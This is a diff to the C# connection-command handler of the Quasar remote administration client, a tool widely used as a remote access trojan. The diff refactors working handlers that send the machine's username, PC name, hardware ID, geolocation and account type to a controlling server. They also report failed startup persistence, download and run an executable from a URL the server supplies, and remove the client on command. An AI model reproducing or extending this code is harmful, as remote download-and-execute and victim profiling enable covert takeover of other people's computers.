@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Net;
 using System.Threading;
+using Quasar.Common.IO;
+using Quasar.Common.Messages;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Helper;
@@ -13,30 +15,45 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
     public static partial class CommandHandler
     {
-        public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
+        public static void HandleGetAuthentication(GetAuthentication command, Client client)
         {
             GeoLocationHelper.Initialize();
-            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(),
-                GeoLocationHelper.GeoInfo.Country, GeoLocationHelper.GeoInfo.CountryCode,
-                GeoLocationHelper.GeoInfo.Region, GeoLocationHelper.GeoInfo.City, GeoLocationHelper.ImageIndex,
-                DevicesHelper.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG).Execute(client);
+
+            client.Send(new GetAuthenticationResponse
+            {
+                Version = Settings.VERSION,
+                OperatingSystem = PlatformHelper.FullName,
+                AccountType = WindowsAccountHelper.GetAccountType(),
+                Country = GeoLocationHelper.GeoInfo.Country,
+                CountryCode = GeoLocationHelper.GeoInfo.CountryCode,
+                Region = GeoLocationHelper.GeoInfo.Region,
+                City = GeoLocationHelper.GeoInfo.City,
+                ImageIndex = GeoLocationHelper.ImageIndex,
+                Id = DevicesHelper.HardwareId,
+                Username = WindowsAccountHelper.GetName(),
+                PcName = SystemHelper.GetPcName(),
+                Tag = Settings.TAG
+            });
 
             if (ClientData.AddToStartupFailed)
             {
                 Thread.Sleep(2000);
-                new Packets.ClientPackets.SetStatus("Adding to startup failed.").Execute(client);
+                client.Send(new SetStatus
+                {
+                    Message = "Adding to startup failed."
+                });
             }
         }
 
-        public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
+        public static void HandleDoClientUpdate(DoClientUpdate command, Client client)
         {
             // i dont like this updating... if anyone has a better idea feel free to edit it
-            if (string.IsNullOrEmpty(command.DownloadURL))
+            if (string.IsNullOrEmpty(command.DownloadUrl))
             {
-                if (!_renamedFiles.ContainsKey(command.ID))
-                    _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(".exe"));
+                if (!_renamedFiles.ContainsKey(command.Id))
+                    _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(".exe"));
 
-                string filePath = _renamedFiles[command.ID];
+                string filePath = _renamedFiles[command.Id];
 
                 try
                 {
@@ -50,18 +67,18 @@ namespace xClient.Core.Commands
 
                     if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                     {
-                        if (_renamedFiles.ContainsKey(command.ID))
-                            _renamedFiles.Remove(command.ID);
-                        new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
+                        if (_renamedFiles.ContainsKey(command.Id))
+                            _renamedFiles.Remove(command.Id);
+                        client.Send(new SetStatus {Message = "Updating..."});
                         ClientUpdater.Update(client, filePath);
                     }
                 }
                 catch (Exception ex)
                 {
-                    if (_renamedFiles.ContainsKey(command.ID))
-                        _renamedFiles.Remove(command.ID);
+                    if (_renamedFiles.ContainsKey(command.Id))
+                        _renamedFiles.Remove(command.Id);
                     NativeMethods.DeleteFile(filePath);
-                    new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
+                    client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
                 }
 
                 return;
@@ -69,7 +86,7 @@ namespace xClient.Core.Commands
 
             new Thread(() =>
             {
-                new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);
+                client.Send(new SetStatus { Message = "Downloading file..." });
 
                 string tempFile = FileHelper.GetTempFilePath(".exe");
 
@@ -78,24 +95,24 @@ namespace xClient.Core.Commands
                     using (WebClient c = new WebClient())
                     {
                         c.Proxy = null;
-                        c.DownloadFile(command.DownloadURL, tempFile);
+                        c.DownloadFile(command.DownloadUrl, tempFile);
                     }
                 }
                 catch
                 {
-                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
+                    client.Send(new SetStatus {Message = "Download failed!"});
                     return;
                 }
 
-                new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
+                client.Send(new SetStatus {Message = "Replacing executable..."});
 
                 ClientUpdater.Update(client, tempFile);
             }).Start();
         }
 
-        public static void HandleDoClientUninstall(Packets.ServerPackets.DoClientUninstall command, Client client)
+        public static void HandleDoClientUninstall(DoClientUninstall command, Client client)
         {
-            new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);
+            client.Send(new SetStatus {Message = "Uninstalling... good bye :-("});
 
             ClientUninstaller.Uninstall(client);
         }
